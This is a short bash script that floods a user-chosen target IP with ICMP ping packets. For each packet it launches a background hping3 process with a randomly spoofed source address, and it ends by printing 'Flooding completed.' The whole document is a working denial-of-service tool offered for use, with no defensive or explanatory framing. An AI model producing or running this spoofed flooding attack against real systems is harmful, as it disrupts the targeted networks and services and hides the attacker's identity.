#!/bin/bash

# Prompt the user for the target's IP address
read -p "Enter the target's IP address: " target_ip

# Number of packets to send
read -p "Enter the number of packets to send: " packet_count

# Interval between packets (in milliseconds)
read -p "Enter the interval between packets (ms): " interval

# Function to generate a random IP address
generate_random_ip() {
    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}

# Loop to send spoofed ping packets
for ((i = 1; i <= packet_count; i++)); do
    spoofed_source_address=$(generate_random_ip)
    hping3 -1 -a $spoofed_source_address -i u$interval $target_ip &
done

# Wait for all background jobs to finish
wait

echo "Flooding completed."
